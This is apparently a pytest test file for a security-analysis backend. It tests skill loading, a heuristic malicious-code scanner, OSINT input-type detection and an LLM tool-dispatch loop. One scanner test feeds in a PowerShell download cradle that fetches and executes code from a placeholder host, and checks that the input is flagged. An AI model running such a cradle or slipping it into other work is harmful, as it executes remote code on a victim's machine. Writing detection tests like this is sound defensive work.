import sys
import os

_project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from unittest.mock import patch, MagicMock

import pytest


class TestGstackSkills:
    def test_list_skills(self):
        from backend.ai_tools import gstack_list_skills
        skills = gstack_list_skills()
        assert isinstance(skills, list)
        assert "investigate" in skills
        assert "review" in skills
        assert "cso" in skills

    def test_load_skill_valid(self):
        from backend.ai_tools import gstack_load_skill
        result = gstack_load_skill("investigate")
        assert result["ok"] is True
        assert "Iron Law" in result["content"]

    def test_load_skill_invalid(self):
        from backend.ai_tools import gstack_load_skill
        result = gstack_load_skill("does_not_exist")
        assert result["ok"] is False
        assert "available" in result


class TestHeuristicCodeScan:
    def test_analyze_code_imports(self):
        from backend.ai_tools import gstack_analyze_code
        assert callable(gstack_analyze_code)

    def test_empty_payload(self):
        from backend.ai_tools import gstack_analyze_code
        result = gstack_analyze_code("")
        assert result["ok"] is False
        assert result["analysis"]["risk_verdict"] == "unknown"

    def test_heuristic_fallback_detects_cradle(self):
        from backend.ai_tools import gstack_analyze_code
        # Force LLM failure so the deterministic fallback runs
        with patch("backend.ai_tools.cognitive_arsenal.httpx.post", side_effect=Exception("offline")):
            result = gstack_analyze_code(
                "powershell -enc AAAA -c iex(new-object net.webclient).downloadstring('http://x/e')"
            )
        assert result["model"] == "heuristic_fallback"
        verdict = result["analysis"]["risk_verdict"]
        assert verdict in ("suspicious", "malicious")

    def test_extract_json_block(self):
        from backend.ai_tools.cognitive_arsenal import _extract_json_block
        assert _extract_json_block('noise {"tool": "web_search"} noise') == {"tool": "web_search"}
        assert _extract_json_block("no json here") is None


class TestOsintArsenal:
    def test_catalog_loads(self):
        from backend.ai_tools import load_osint_catalog
        catalog = load_osint_catalog()
        assert len(catalog) >= 500

    def test_detect_types(self):
        from backend.ai_tools import osint_detect_type
        assert osint_detect_type("192.168.1.1") == "ipv4"
        assert osint_detect_type("evil.example.com") == "domain"
        assert osint_detect_type("https://evil.com/x") == "url"
        assert osint_detect_type("a" * 64) == "hash"
        assert osint_detect_type("a@b.com") == "email"

    def test_suggest_tools(self):
        from backend.ai_tools import osint_arsenal_suggest
        result = osint_arsenal_suggest("subdomain enumeration", limit=3)
        assert result["catalog_size"] >= 500
        assert len(result["tools"]) <= 3


class TestMasterToolLoop:
    def test_manifest_contains_all_tools(self):
        from backend.ai_tools import get_master_tools_manifest
        manifest = get_master_tools_manifest()
        for tool in ("web_search", "read_page", "enrich_ioc", "suggest_osint_tools", "analyze_code"):
            assert tool in manifest

    def test_loop_returns_list_when_llm_down(self):
        from backend.ai_tools import run_master_tool_loop
        import backend.ai_tools.cognitive_arsenal as ca
        with patch.object(ca.httpx, "post", side_effect=Exception("offline")):
            findings = run_master_tool_loop("test context", max_rounds=2)
        assert findings == []

    def test_dispatch_unknown_tool(self):
        from backend.ai_tools.cognitive_arsenal import _dispatch
        result = _dispatch("no_such_tool", {})
        assert result["ok"] is False

    def test_dispatch_missing_arg(self):
        from backend.ai_tools.cognitive_arsenal import _dispatch
        result = _dispatch("web_search", {})
        assert result["ok"] is False
        assert "query" in result["error"]
